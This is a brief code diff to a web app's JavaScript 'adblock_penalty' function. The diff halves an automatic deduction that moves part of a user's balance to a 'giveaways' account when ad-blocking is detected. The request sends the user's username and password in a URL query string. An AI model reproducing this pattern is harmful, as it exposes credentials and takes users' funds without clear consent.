@@ -526,8 +526,8 @@ function adblock_penalty(balance) {
             '?username=' + encodeURIComponent(username) +
             "&password=" + encodeURIComponent(password) +
             "&recipient=giveaways" + 
-            "&amount=" + encodeURIComponent(balance*0.001) +
-            "&memo=AdBlock usage penalty (0.1 perc)",
+            "&amount=" + encodeURIComponent(balance*0.0005) +
+            "&memo=AdBlock usage penalty (0.05 perc)",
             function(data) {console.log(data)});
 
     localStorage.setItem("last-ab-penalty", new Date());
